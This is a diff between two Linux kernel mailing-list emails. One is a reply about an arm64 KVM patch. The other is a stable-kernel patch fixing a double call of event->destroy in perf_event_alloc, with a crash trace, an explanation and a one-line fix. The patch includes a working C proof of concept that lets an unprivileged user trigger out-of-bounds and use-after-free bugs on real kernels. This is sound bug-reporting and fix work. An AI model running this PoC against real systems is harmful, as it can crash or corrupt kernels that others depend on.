@@ -1,110 +1,216 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C806A26A1DA;
-	Mon, 19 May 2025 14:11:17 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 57699283C97;
+	Mon, 19 May 2025 14:38:04 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.48
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1747663877; cv=none; b=WXBxSksG1RBQ02FixWaLCC9vFdwJyo2gqDAGt7MgUsUC0/DtbQRuvt8zA0qZenLa4Y9sCNgcQOpv5ZneFDosb72X0COtkrmavWe4JiVnHPzXCRPklg+n2xHuaLUZsnI7TAx2BSyDXiaYNoaZ3zYnjnvjnNsmdKB14rGjXRltmJ8=
+	t=1747665485; cv=none; b=i7ZofO0cAYQr1lNrhM5NRtbDuOjaG+BSsp+myOoPSxHdmRWNTI77XudjrLe6Xn/C5qyH1qHtn+/bBoRm0i9AlxZ4i7Hrdp5XSbHkZ3rnX8iEXURZ6z3NBZIqRXeSaGHo35lGOzsJ25ynfX4DavkKmhmZWsVHVpzMSuk8Mk7KbB0=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1747663877; c=relaxed/simple;
-	bh=e1ejy1mxpIjt2Bw3FSFixCpdrvKaPbVj5b42czyYzxg=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=uMpclgJrUM/4xXc+Es7QOv7z2OZbiyYR0/2bx1UhDVcgO2xVvT/NBhaYUTiw45Di+R9xwZJ7TN3kv/YjNhvGCB8prisMtVRz5iN5uX4sy/MKhN27n6YoG8FXjSKWJA3LiDzdKvGFIrmjLBEhO4UeXBLVjRc1TBmrLzc3Ord500Q=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=UuwiVYBO; arc=none smtp.client-ip=10.30.226.201
+	s=arc-20240116; t=1747665485; c=relaxed/simple;
+	bh=gAt85zQuH7Ja3vEags4uoPq7LdbNyWTR60A0wFFgeQs=;
+	h=From:To:Cc:Subject:Date:Message-Id; b=fPeQRcoIPSzCH/CmW4zhJB1IGnciCZgEqO/876+2JYAArRzuCc0bKy4g+wJm51tsjoeFl3JF7VNRClOvkCJottsNM41tkbx6nZeJ5MJdW3r7xJHOB4YPFsXDDuxpmqLbbLhvRDfBjDtC97pgKHGSPJfk0M5SI6Hs+hVS8n77Chc=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=aF5nh7YT; arc=none smtp.client-ip=209.85.216.48
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="UuwiVYBO"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 5DA3BC4CEE4;
-	Mon, 19 May 2025 14:11:14 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
-	s=k20201202; t=1747663877;
-	bh=e1ejy1mxpIjt2Bw3FSFixCpdrvKaPbVj5b42czyYzxg=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=UuwiVYBOmT0r42eJ2BqI4kUGWbraux+H8fHr1YvAZeA9N9XwhGUYwmIXillv60Ih9
-	 /kCS7UbncUQhT1kEgfPVltZdCiGO4EanQSEKr8vci8xkPu27AYe1tHnGn0g6pHiVRi
-	 4N3l359n5U3jgumzYPeuR5rRhukDobMO2WzWpCRDMJUhT87QF8K7EJJe0lQ8kMu1X/
-	 5eqDmq7Q0tRQuOm7M3bogWphHNV/480ddeGJLnGUXZifEC24lUKmPMAzMUn22R7wr7
-	 IZ8UWdYDSsMQlvY/GZFu9phFXmpLAj7fz8By3/nS93KPzpNrJkpwxddkt66syizpKC
-	 SfoWiaf3/nmPA==
-Date: Mon, 19 May 2025 15:11:11 +0100
-From: Will Deacon <will@kernel.org>
-To: "Rob Herring (Arm)" <robh@kernel.org>
-Cc: Mark Rutland <mark.rutland@arm.com>,
-	Catalin Marinas <catalin.marinas@arm.com>,
-	Jonathan Corbet <corbet@lwn.net>, Marc Zyngier <maz@kernel.org>,
-	Oliver Upton <oliver.upton@linux.dev>,
-	Joey Gouly <joey.gouly@arm.com>,
-	Suzuki K Poulose <suzuki.poulose@arm.com>,
-	Zenghui Yu <yuzenghui@huawei.com>,
-	James Clark <james.clark@linaro.org>,
-	Anshuman Khandual <anshuman.khandual@arm.com>,
-	Leo Yan <leo.yan@arm.com>, linux-arm-kernel@lists.infradead.org,
-	linux-perf-users@vger.kernel.org, linux-kernel@vger.kernel.org,
-	linux-doc@vger.kernel.org, kvmarm@lists.linux.dev
-Subject: Re: [PATCH v21 3/4] KVM: arm64: nvhe: Disable branch generation in
- nVHE guests
-Message-ID: <20250519141106.GC16991@willie-the-truck>
-References: <20250407-arm-brbe-v19-v21-0-ff187ff6c928@kernel.org>
- <20250407-arm-brbe-v19-v21-3-ff187ff6c928@kernel.org>
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="aF5nh7YT"
+Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-3081f72c271so3916134a91.0;
+        Mon, 19 May 2025 07:38:04 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1747665483; x=1748270283; darn=vger.kernel.org;
+        h=message-id:date:subject:cc:to:from:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=QUAue7lju4/IXaynIzGavH1If8DEHLtoUCFcc+xrYWc=;
+        b=aF5nh7YT6t4GphO6r9/RIo3XKGif14Cpo6CC0F4JO5zMBRG+u0VGJGNxc3lY3HrLtc
+         lW51lnqr+RFBOyzniV2gjFWsW9ywG1VQutpkN5nq7bqLNsrfAjxGZME8VmFDgWpTWChf
+         9bDEBfZLvZjDdShEMTaiE2e1T2R3TaAeQ5mEPIw7HHDo4mHZVhz//InHhXvXqrJNruPj
+         IU1v1S6gVUKE7IXuIkPN+vN7c7Ulcj9LdizLh+vvA8rnlaL7JdIg8AzcN1osvHw3Ensq
+         kd+JrWtrTD4OY9eM236Oj0280relzFV2juMMawjAzlnDjXywbzY4bAndKc2V7pWj59ci
+         Mvtw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1747665483; x=1748270283;
+        h=message-id:date:subject:cc:to:from:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to;
+        bh=QUAue7lju4/IXaynIzGavH1If8DEHLtoUCFcc+xrYWc=;
+        b=OSXPqLLsltvdkxfixDLgRV3AiXjSjYg88EypYZCUU1cGrRf8NtW9vY9fxhCL3CH9Wx
+         mXt+K9sHDyNbJwFvWqd5vPUrqcN+ZrfmmqYHLcxj2zDoyEAvlnwB3TVbh2IvpoQX2M6A
+         bE6B8NauzBIHByn+DLiHN9uASzCMonHv00HEhEusNnkVtFz9KiVUvuM5NRNgYrj3iT2i
+         KkOd9FAGT35IUaXgD+c0ITwNXWe40mg1zw34hEustKg0gVHI746Rpo6qNdYAT6pILFRx
+         3qDLovqb44T+P0tXwNWbTFw+dA8acBYzYu9vM4uIt6djm2MmiuYdxhu1uEimKQmX5Sea
+         N7Yg==
+X-Forwarded-Encrypted: i=1; AJvYcCUsfokwiz/NIm5n/gYwZDU9yVhPruczptsqNCTwPtZzEAQNUu7qB7DkCwV/gb0wXl8szkgWUKcjAZ80qLM=@vger.kernel.org, AJvYcCWWt0qVO/KJ/KtXgYf1o7QqzTUiQq/AhJd9lVyWlKUn7PWUdD8PuWkIfFmry7FZmzSSKwAllmG0fnfHYUROZ5FuFQ==@vger.kernel.org
+X-Gm-Message-State: AOJu0YxcGqBiKKdj082xtOZKehbs6zjnmx498W5OsMSE96dM3Xubl3P4
+	7CVSBGKDRPifl799aYa5aX446xeEx2nhoCxrMB3cobDPwthCy/twHWN0JUy4redb
+X-Gm-Gg: ASbGnctdYR77a+8NEaPIXxebq7ZP3m/3jYhdtH6jJ4HiIkzBlXD9feln9pRX33F/Bcz
+	/4+tbI/VOu4W4FdtCsxZFb2aZTcjLboJzjCP0yo3iRFH8OKSy/A1roNx+gEROcILEYFVYYBguae
+	mgn0/r1npU20I5qinsMc4Pknj7VYomb5OUcJ+jW6orI4KbeU2BIrP+gvB+Rj8ewYkcFRBnXMvQS
+	R9PH0KmmoZM9+JLSwwey+6G6clxfQ5mStKNxrYzN8E7lbSAcfE2bE+9zKZzM6m8r17//grpyCge
+	ojLrYWeAcQBp7ig1SSN7f6WJJT9kwjP23+wmf2RKTT9yrE8dJQBJnj10lYTz/E/yXU4yttBZbE8
+	eFuvgzdQ=
+X-Google-Smtp-Source: AGHT+IFsymKgFw8VDGAcL4fu5PSwCz9cVlgoSOxKeBp1loAmVB7h2LufHLhcTYN/2nLq8NDrELzlJA==
+X-Received: by 2002:a17:90a:c883:b0:2ee:e518:c1cb with SMTP id 98e67ed59e1d1-30e830c797dmr20934920a91.7.1747665483282;
+        Mon, 19 May 2025 07:38:03 -0700 (PDT)
+Received: from ubuntu.localdomain ([39.86.156.14])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-30ea61d8b87sm4835976a91.30.2025.05.19.07.37.57
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 19 May 2025 07:38:02 -0700 (PDT)
+From: Penglei Jiang <superman.xpt@gmail.com>
+To: peterz@infradead.org,
+	mingo@redhat.com,
+	acme@kernel.org,
+	namhyung@kernel.org
+Cc: mark.rutland@arm.com,
+	alexander.shishkin@linux.intel.com,
+	jolsa@kernel.org,
+	irogers@google.com,
+	adrian.hunter@intel.com,
+	kan.liang@linux.intel.com,
+	linux-perf-users@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	luckd0g@163.com,
+	Penglei Jiang <superman.xpt@gmail.com>
+Subject: [PATCH 6.14.y] perf: fix double calling of event->destroy
+Date: Mon, 19 May 2025 07:37:52 -0700
+Message-Id: <20250519143752.37372-1-superman.xpt@gmail.com>
+X-Mailer: git-send-email 2.17.1
 Precedence: bulk
 X-Mailing-List: linux-perf-users@vger.kernel.org
 List-Id: <linux-perf-users.vger.kernel.org>
 List-Subscribe: <mailto:linux-perf-users+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-perf-users+unsubscribe@vger.kernel.org>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20250407-arm-brbe-v19-v21-3-ff187ff6c928@kernel.org>
-User-Agent: Mutt/1.10.1 (2018-07-13)
 
-On Mon, Apr 07, 2025 at 12:41:32PM -0500, Rob Herring (Arm) wrote:
-> From: Anshuman Khandual <anshuman.khandual@arm.com>
-> 
-> While BRBE can record branches within guests, the host recording
-> branches in guests is not supported by perf (though events are).
-> Support for BRBE in guests will supported by providing direct access
-> to BRBE within the guests. That is how x86 LBR works for guests.
-> Therefore, BRBE needs to be disabled on guest entry and restored on
-> exit.
-> 
-> For nVHE, this requires explicit handling for guests. Before
-> entering a guest, save the BRBE state and disable the it. When
-> returning to the host, restore the state.
-> 
-> For VHE, it is not necessary. We initialize
-> BRBCR_EL1.{E1BRE,E0BRE}=={0,0} at boot time, and HCR_EL2.TGE==1 while
-> running in the host. We configure BRBCR_EL2.{E2BRE,E0HBRE} to enable
-> branch recording in the host. When entering the guest, we set
-> HCR_EL2.TGE==0 which means BRBCR_EL1 is used instead of BRBCR_EL2.
-> Consequently for VHE, BRBE recording is disabled at EL1 and EL0 when
-> running a guest.
-> 
-> Should recording in guests (by the host) ever be desired, the perf ABI
-> will need to be extended to distinguish guest addresses (struct
-> perf_branch_entry.priv) for starters. BRBE records would also need to be
-> invalidated on guest entry/exit as guest/host EL1 and EL0 records can't
-> be distinguished.
-> 
-> Signed-off-by: Anshuman Khandual <anshuman.khandual@arm.com>
-> Signed-off-by: Mark Rutland <mark.rutland@arm.com>
-> Co-developed-by: Rob Herring (Arm) <robh@kernel.org>
-> Tested-by: James Clark <james.clark@linaro.org>
-> Signed-off-by: Rob Herring (Arm) <robh@kernel.org>
-> ---
-> v20:
->  - Reword commit message about no guest recording.
->  - Add BRBE to __kvm_vcpu_run() synchronization comment
-> 
-> v19:
->  - Rework due to v6.14 debug flag changes
->  - Redo commit message
-> ---
->  arch/arm64/include/asm/kvm_host.h  |  2 ++
->  arch/arm64/kvm/debug.c             |  4 ++++
->  arch/arm64/kvm/hyp/nvhe/debug-sr.c | 32 ++++++++++++++++++++++++++++++++
->  arch/arm64/kvm/hyp/nvhe/switch.c   |  2 +-
->  4 files changed, 39 insertions(+), 1 deletion(-)
+Affected kernel versions: greater than or equal to 6.12.24 and less than 6.15
 
-This one also needs reviewing from the KVM/arm64 side...
+[BUG]
+[   40.427200] ------------[ cut here ]------------
+[   40.428671] UBSAN: array-index-out-of-bounds in kernel/events/hw_breakpoint.c:245:3
+[   40.430615] index 5 is out of range for type 'atomic_t [4]'
+[   40.432261] CPU: 0 UID: 65534 PID: 226 Comm: a.out Tainted: G        W          6.14.7 #1
+[   40.432267] Tainted: [W]=WARN
+[   40.432268] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   40.432270] Call Trace:
+[   40.432272]  <TASK>
+[   40.432274]  dump_stack_lvl+0x53/0x70
+[   40.432313]  __ubsan_handle_out_of_bounds+0xc8/0x100
+[   40.432405]  toggle_bp_slot.constprop.0+0x1c6a/0x1cc0
+[   40.432427]  ? __percpu_down_read+0x4d/0x2b0
+[   40.432437]  register_perf_hw_breakpoint+0xe6/0x270
+[   40.432440]  ? __pfx_register_perf_hw_breakpoint+0x10/0x10
+[   40.432442]  ? kasan_save_track+0x14/0x30
+[   40.432447]  hw_breakpoint_event_init+0x68/0xd0
+[   40.432449]  ? kmem_cache_alloc_node_noprof+0x10c/0x330
+[   40.432465]  perf_try_init_event+0x108/0xb60
+[   40.432468]  perf_event_alloc+0xec0/0x2be0
+[   40.432472]  ? fdget+0x53/0x3a0
+[   40.432482]  __do_sys_perf_event_open+0x351/0x1b50
+[   40.432485]  ? hw_breakpoint_exceptions_notify+0x25f/0x370
+[   40.432489]  ? __pfx___do_sys_perf_event_open+0x10/0x10
+[   40.432492]  ? __pfx_notify_die+0x10/0x10
+[   40.432496]  ? fpregs_assert_state_consistent+0x1b/0xa0
+[   40.432510]  do_syscall_64+0x9e/0x1a0
+[   40.432515]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[   40.432518] RIP: 0033:0x7f1b0b58bfc9
+[   40.432532] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 8
+[   40.432534] RSP: 002b:00007fff11481da8 EFLAGS: 00000206 ORIG_RAX: 000000000000012a
+[   40.432538] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f1b0b58bfc9
+[   40.432540] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00007fff11481dc0
+[   40.432542] RBP: 00007fff11481e40 R08: 0000000000000000 R09: 0000000000000000
+[   40.432543] R10: 00000000ffffffff R11: 0000000000000206 R12: 0000561a1955c060
+[   40.432545] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+[   40.432547]  </TASK>
+[   40.476591] ---[ end trace ]---
 
-Will
+[CAUSE]
+When perf_event_alloc() fails, it calls event->destroy twice.
+
+	perf_event_alloc
+		perf_init_event
+			perf_try_init_event
+				event->destroy
+				~~~~~~~~~~~~~~
+		__free_event
+			event->destroy
+			~~~~~~~~~~~~~~
+
+This double call triggers multiple bugs, some of which low-privilege users
+can also trigger. Examples include:
+
+	hw_breakpoint: array-index-out-of-bounds
+	uprobe: use-after-free
+	kprobe: use-after-free
+	...
+
+[FIX]
+After calling event->destroy in perf_try_init_event(), set it to NULL.
+
+[POC]
+#include <unistd.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <linux/perf_event.h>
+#include <linux/hw_breakpoint.h>
+int main(void) {
+	struct perf_event_attr attr;
+	memset(&attr, 0, sizeof(attr));
+	attr.type = PERF_TYPE_BREAKPOINT;
+	attr.size = sizeof(struct perf_event_attr);
+	attr.disabled = 1;
+	attr.inherit = 1;
+	attr.exclusive = 1;
+	attr.exclude_kernel = 1;
+	attr.bp_type = HW_BREAKPOINT_W;
+	attr.bp_len = HW_BREAKPOINT_LEN_2;
+	attr.sample_regs_user = 1;
+	attr.sample_regs_intr = 0x20000000002;
+	// This code will incorrectly change the value of info->cpu_pinned to -1.
+	syscall(__NR_perf_event_open, &attr, 0, 0x80000000000000, -1, PERF_FLAG_FD_CLOEXEC | 0x4);
+
+	for (int i = 0; i < 100; i++) {
+		memset(&attr, 0, sizeof(attr));
+		attr.type = PERF_TYPE_BREAKPOINT;
+		attr.size = sizeof(attr);
+		attr.config = 0;
+		attr.bp_type = HW_BREAKPOINT_W;
+		int var = 0;
+ 		attr.bp_addr = (unsigned long)&var + i;
+		attr.bp_len = HW_BREAKPOINT_LEN_2;
+		attr.sample_period = 0;
+		attr.disabled = 0;
+		attr.exclude_kernel = 1;
+		attr.exclude_hv = 1;
+		attr.read_format = 0;
+		syscall(__NR_perf_event_open, &attr, 0, 0, -1, 0);
+	}
+	return 0;
+}
+
+Reported-by: Penglei Jiang <superman.xpt@gmail.com>
+Reported-by: Jianzhou Zhao <luckd0g@163.com>
+Fixes: 1209b0b29fd4 ("perf/core: Simplify the perf_event_alloc() error path")
+Closes: https://lore.kernel.org/all/3a701a0.8f4a.196860948e3.Coremail.luckd0g@163.com
+Closes: https://lore.kernel.org/all/tencent_B50959BC76205E0AE666AE21F7A07D017306@qq.com
+Signed-off-by: Penglei Jiang <superman.xpt@gmail.com>
+---
+ kernel/events/core.c | 4 +++-
+ 1 file changed, 3 insertions(+), 1 deletion(-)
+
+diff --git a/kernel/events/core.c b/kernel/events/core.c
+index 93ce810384c9..29300bde69db 100644
+--- a/kernel/events/core.c
++++ b/kernel/events/core.c
+@@ -12045,8 +12045,10 @@ static int perf_try_init_event(struct pmu *pmu, struct perf_event *event)
+ 			}
+ 		}
+ 
+-		if (ret && event->destroy)
++		if (ret && event->destroy) {
+ 			event->destroy(event);
++			event->destroy = NULL;
++		}
+ 	}
+ 
+ 	if (ret) {
+-- 
+2.17.1
+
